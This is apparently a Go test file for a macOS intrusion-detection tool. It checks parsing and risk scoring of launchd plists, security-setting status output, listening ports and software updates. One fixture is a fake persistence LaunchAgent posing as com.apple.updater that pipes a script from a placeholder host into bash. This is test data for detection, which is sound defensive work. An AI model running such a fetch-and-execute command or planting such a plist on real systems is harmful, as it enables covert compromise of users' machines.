package macos

import (
	"strings"
	"testing"

	"github.com/creativeprofit22/intruder-hunter/internal/report"
)

func TestParsePlutilLaunchPlistAndScoreSuspiciousInterpreter(t *testing.T) {
	input := `{
  "KeepAlive" => true
  "Label" => "com.apple.updater"
  "ProgramArguments" => [
    0 => "/bin/bash"
    1 => "-c"
    2 => "curl https://example.invalid/p.sh | bash"
  ]
  "RunAtLoad" => true
  "StandardErrorPath" => "/tmp/.err"
}`
	plist := parsePlutilLaunchPlist(input)
	plist.Path = "/Users/alice/Library/LaunchAgents/com.apple.updater.plist"

	if plist.Label != "com.apple.updater" {
		t.Fatalf("Label = %q", plist.Label)
	}
	if len(plist.ProgramArguments) != 3 || plist.ProgramArguments[0] != "/bin/bash" {
		t.Fatalf("ProgramArguments = %#v", plist.ProgramArguments)
	}
	if !plist.RunAtLoad || !plist.KeepAlive {
		t.Fatalf("RunAtLoad/KeepAlive not parsed: %#v", plist)
	}

	assessment := assessLaunchPlist(plist)
	if assessment.Severity != report.SeverityWarning && assessment.Severity != report.SeverityCritical {
		t.Fatalf("expected suspicious severity, got %#v", assessment)
	}
	if !containsReason(assessment.Reasons, "interpreter") {
		t.Fatalf("expected interpreter reason, got %#v", assessment.Reasons)
	}
}

func TestAssessLaunchPlistCriticalForDaemonPointingAtUserTemp(t *testing.T) {
	plist := launchPlist{
		Path:             "/Library/LaunchDaemons/com.vendor.helper.plist",
		Label:            "com.vendor.helper",
		Program:          "/Users/alice/Downloads/.helper",
		RunAtLoad:        true,
		KeepAlive:        true,
		ProgramArguments: []string{"/Users/alice/Downloads/.helper"},
	}
	assessment := assessLaunchPlist(plist)
	if assessment.Severity != report.SeverityCritical {
		t.Fatalf("Severity = %q, reasons=%v score=%d", assessment.Severity, assessment.Reasons, assessment.Score)
	}
	if assessment.Target != plist.Program {
		t.Fatalf("Target = %q", assessment.Target)
	}
}

func TestParsePlistBuddyLaunchPlist(t *testing.T) {
	input := `Dict {
    Label = com.example.agent
    Program = /Users/Shared/.agent
    ProgramArguments = Array {
        /Users/Shared/.agent
        --flag
    }
    RunAtLoad = true
}`
	plist := parsePlutilLaunchPlist(input)
	if plist.Label != "com.example.agent" || plist.Program != "/Users/Shared/.agent" || len(plist.ProgramArguments) != 2 || !plist.RunAtLoad {
		t.Fatalf("unexpected plist parse: %#v", plist)
	}
}

func TestSecurityCommandOutputParsing(t *testing.T) {
	tests := []struct {
		name    string
		parser  func(string) namedStatus
		input   string
		enabled bool
		known   bool
	}{
		{"sip enabled", parseEnabledDisabled, "System Integrity Protection status: enabled.", true, true},
		{"gatekeeper disabled", parseEnabledDisabled, "assessments disabled", false, true},
		{"filevault on", parseOnOff, "FileVault is On.", true, true},
		{"remote login off", parseOnOff, "Remote Login: Off", false, true},
		{"unknown", parseEnabledDisabled, "not available", false, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := tt.parser(tt.input)
			if got.Enabled != tt.enabled || got.Known != tt.known {
				t.Fatalf("got %#v", got)
			}
		})
	}
}

func TestParseLsofListenersAndAssessRisk(t *testing.T) {
	input := `COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
sshd      99 root    3u  IPv4  0x00      0t0  TCP *:22 (LISTEN)
node     101 bob    9u  IPv4  0x01      0t0  TCP 127.0.0.1:3000 (LISTEN)`
	listeners := parseLsofListeners(input)
	if len(listeners) != 2 {
		t.Fatalf("len = %d (%#v)", len(listeners), listeners)
	}
	if listeners[0].Command != "sshd" || listeners[0].PID != "99" || listeners[0].Port != 22 || listeners[0].Address != "0.0.0.0" {
		t.Fatalf("first listener parsed incorrectly: %#v", listeners[0])
	}
	sshRisk := assessListener(listeners[0])
	if sshRisk.Severity != report.SeverityWarning {
		t.Fatalf("SSH severity = %q (%s)", sshRisk.Severity, sshRisk.Reason)
	}
	localRisk := assessListener(listeners[1])
	if localRisk.Severity != report.SeverityOK {
		t.Fatalf("localhost severity = %q (%s)", localRisk.Severity, localRisk.Reason)
	}
}

func TestParseSoftwareUpdateList(t *testing.T) {
	updates := parseSoftwareUpdateList(`Software Update Tool
Finding available software
Software Update found the following new or updated software:
* Label: macOS Foo-1.2
	Title: macOS Foo, Version: 1.2, Size: 100K, Recommended: YES, Action: restart`)
	if len(updates) == 0 {
		t.Fatal("expected updates")
	}
}

func containsReason(reasons []string, needle string) bool {
	for _, reason := range reasons {
		if strings.Contains(reason, needle) {
			return true
		}
	}
	return false
}
